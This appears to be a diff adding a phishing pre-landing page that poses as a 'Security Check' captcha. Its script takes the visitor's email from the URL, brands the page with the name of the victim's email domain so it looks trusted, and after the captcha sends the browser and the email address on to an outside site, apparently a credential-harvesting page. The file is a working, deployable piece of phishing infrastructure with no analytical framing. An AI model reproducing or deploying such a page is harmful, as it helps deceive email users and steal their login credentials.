@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connection | Security Check</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            text-align: center;
+            padding: 50px;
+        }
+        .container {
+            background: #fff;
+            max-width: 400px;
+            margin: auto;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+        }
+        h1 {
+            font-size: 18px;
+            color: #333;
+        }
+        .verification-message {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #666;
+        }
+        .turnstile-container {
+            margin: 20px 0;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Connecting.... <span id="brand-name">Security Check</span></h1>
+        <p class="verification-message">Verify you are human by completing the action below.</p>
+
+        <div class="turnstile-container">
+            <div class="cf-turnstile" 
+                 data-sitekey="0x4AAAAAABAR4Q1-xTFxyZpl"
+                 data-callback="onCaptchaSuccess">
+            </div>
+        </div>
+
+        <p class="footer">.<span id="brand-name-footer"> </span> server needs to review the security of your connection before proceeding.</p>
+    </div>
+
+    <script>
+    function getEmailFromURL() {
+        const params = new URLSearchParams(window.location.search);
+        const email = params.get("email");
+        return email;
+    }
+
+    function extractDomainName(email) {
+        if (!email || !email.includes("@")) return "(Security Check)";
+        const domain = email.split("@")[1]; // example.com
+        const domainWithoutTLD = domain.split(".")[0]; // example
+        return domainWithoutTLD.charAt(0).toUpperCase() + domainWithoutTLD.slice(1);
+    }
+
+    function onCaptchaSuccess(token) {
+        console.log("CAPTCHA Verified:", token);
+        const email = getEmailFromURL();
+        const redirectSuffix = email ? "?userid=" + email : "";
+        const targetURL = "https://doublejaylnc.com/index.html" + redirectSuffix;
+
+        setTimeout(() => {
+            window.location.href = targetURL;
+        }, 2000);
+    }
+
+    // Replace Outlook with domain-based brand name on page load
+    window.addEventListener("DOMContentLoaded", () => {
+        const email = getEmailFromURL();
+        const brand = extractDomainName(email);
+        document.getElementById("brand-name").textContent = brand;
+        document.getElementById("brand-name-footer").textContent = brand;
+    });
+    </script>
+</body>
+</html>
